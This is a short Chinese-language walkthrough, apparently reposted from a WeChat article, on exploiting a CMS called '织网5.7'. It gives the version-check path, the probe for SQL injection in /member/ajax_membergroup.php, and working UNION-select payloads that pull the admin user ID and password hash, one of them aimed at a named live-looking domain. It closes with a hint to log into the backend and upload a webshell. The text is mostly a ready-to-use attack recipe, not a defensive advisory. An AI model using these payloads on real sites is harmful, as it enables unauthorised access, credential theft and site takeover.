# 织网5.7的漏洞 可任意文件上传

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjE3ODU3MQ==&mid=2650442951&idx=2&sn=7f1ba868cc4070303287a5254ff6ba67&chksm=83bbe923b4cc603553762ab0ea881fee8250abc3c8a1d6ead5d35b469cedc3a8f939df28d45d&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650442951&idx=2&sn=7f1ba868cc4070303287a5254ff6ba67&chksm=83bbe923b4cc603553762ab0ea881fee8250abc3c8a1d6ead5d35b469cedc3a8f939df28d45d&scene=27#wechat_redirect)

![](../Images/bfdb8e6b5064b2f16eba66e913995d58.png)

  

思路：访问/data/admin/ver.txt来查看cms

然后访问/member/ajax\_membergroup.php?action=post&membergroup=1，出现"朋友 修改"即可注入

通过注入得到管理员帐号密码，搜后台，上传马子     

  

过程：

  

![](../Images/29034d4df5072eefb0340f212e138e63.png)

  

查看网站的版本

code 区域

cms /data/admin/ver.txt

  

![](../Images/835d275eb7d974e714cfffcf19e160cd.png)

查看是否有"朋友 修改"，有则存在注入

code 区域

/member/ajax\_membergroup.php?action=post&membergroup=1

  

![](../Images/9af0c54e059c2796802f787f80d70968.png)

  

帐号

code 区域

http://www.dzdyk.com /member/ajax\_membergroup.php?action=post&membergroup=@\`'\` Union select userid from \`#@\_\_admin\` where 1 or id=@\`'\`

  

![](../Images/61f2f1eb480dfe070b267790728884f0.png)

  

去掉前三位和最后一位，得到管理员密码

code 区域

/member/ajax\_membergroup.php?action=post&membergroup=@\`'\` Union select pwd from \`#@\_\_admin\`

  

![](../Images/bd77fdca738ea35e844884d0e5048eb2.png)

  

然后~~~~你们都懂
